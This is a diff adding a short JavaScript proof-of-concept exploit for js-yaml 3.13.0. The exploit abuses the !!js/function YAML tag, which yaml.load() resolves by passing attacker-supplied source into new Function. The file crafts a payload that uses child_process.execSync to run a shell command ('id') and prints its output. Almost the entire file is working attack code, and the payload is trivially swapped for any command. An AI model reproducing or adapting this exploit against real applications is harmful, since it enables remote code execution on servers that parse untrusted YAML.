@@ -1,0 +1,23 @@
+```javascript
+// Exploit for js-yaml 3.13.0 arbitrary code execution via !!js/function tag
+// yaml.load() uses DEFAULT_FULL_SCHEMA by default, which resolves the
+// "!!js/function" tag by feeding attacker-controlled source straight into
+// `new Function(...)` (see node_modules/js-yaml/lib/js-yaml/type/js/function.js).
+// Any application that parses untrusted YAML with yaml.load() is vulnerable
+// to full remote code execution.
+
+const yaml = require("./node_modules/js-yaml");
+
+const maliciousYaml = `
+exploit: !!js/function >
+  function () {
+    return process.mainModule.require('child_process')
+      .execSync('id').toString();
+  }
+`;
+
+const doc = yaml.load(maliciousYaml);
+
+// Triggering the constructed function executes attacker-supplied shell command
+console.log("Command output:\n" + doc.exploit());
+```
